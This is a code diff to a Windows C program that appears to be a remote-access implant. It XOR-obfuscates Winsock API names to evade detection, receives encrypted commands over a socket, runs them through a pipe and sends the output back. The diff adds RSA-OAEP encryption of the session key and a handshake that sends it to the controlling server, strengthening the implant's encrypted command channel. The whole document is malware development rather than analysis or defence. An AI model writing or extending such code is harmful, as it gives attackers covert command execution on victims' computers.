@@ -112,7 +112,8 @@ int main()
     BCRYPT_KEY_HANDLE rsaKey = NULL;
     BYTE *rsaPbinput = HeapAlloc(GetProcessHeap(), 0, 512);
     ULONG rsaCbintput = sizeof(rsaPbinput);
-
+    BYTE rsaEncrypted[512];
+    ULONG rsaEncryptedLen = sizeof(rsaEncrypted);
     status = BCryptOpenAlgorithmProvider(&rsaAlgorithm, BCRYPT_RSA_ALGORITHM, NULL, 0);
     if (!BCRYPT_SUCCESS(status))
     {
@@ -128,8 +129,17 @@ int main()
         0);
 
 
-
-        
+    status = BCryptEncrypt(
+        rsaKey,
+        pbSecret,
+        cbSecret,
+        NULL,
+        NULL,
+        0,
+        rsaEncrypted,
+        sizeof(rsaEncrypted),
+        &rsaEncryptedLen,
+        BCRYPT_PAD_OAEP);
 
     char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; // WSAStartup
     char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00}; // WSASocketA
@@ -196,9 +206,12 @@ int main()
                               ((unsigned char)rcvbuffer[2] << 16) |
                               ((unsigned char)rcvbuffer[3] << 24);
         recv_all(soc, received_message, cmdlen);
-        decrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)received_message, (int)strlen(received_message),
+        if (rsaUsed != 0){
+            decrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)received_message, (int)strlen(received_message),
                         rcvbuffer, sizeof(rcvbuffer), &cmdlen,
                         tag, sizeof(tag), &authInfo);
+        }
+        
         rcvbuffer[cmdlen] = '\0';
 
         if (rcvbuffer[0] == '#')
@@ -221,11 +234,25 @@ int main()
                 int send_result;
                 while (fgets(buf, sizeof(buf), pipe) != NULL)
                 {
-                    encrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)buf, (int)strlen(buf),
+                    if (rsaUsed == 0){
+char header[4];
+header[0] = (char)(rsaEncryptedLen & 0xFF);
+header[1] = (char)((rsaEncryptedLen >> 8) & 0xFF);
+header[2] = (char)((rsaEncryptedLen >> 16) & 0xFF);
+header[3] = (char)((rsaEncryptedLen >> 24) & 0xFF);
+
+send_all(soc, header, sizeof(header));
+send_all(soc, (char *)rsaEncrypted, (int)rsaEncryptedLen);
+rsaUsed++;
+                    }
+                    else{
+                        encrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)buf, (int)strlen(buf),
                                     result_buf, sizeof(result_buf), &ciphertext_len,
                                     tag, sizeof(tag));
 
                     send_result = send_all(soc, result_buf, (int)strlen(result_buf));
+                    }
+                    
                     // send_result = send(soc, buf, (int)strlen(buf), 0);
                     if (send_result <= 0)
                     {
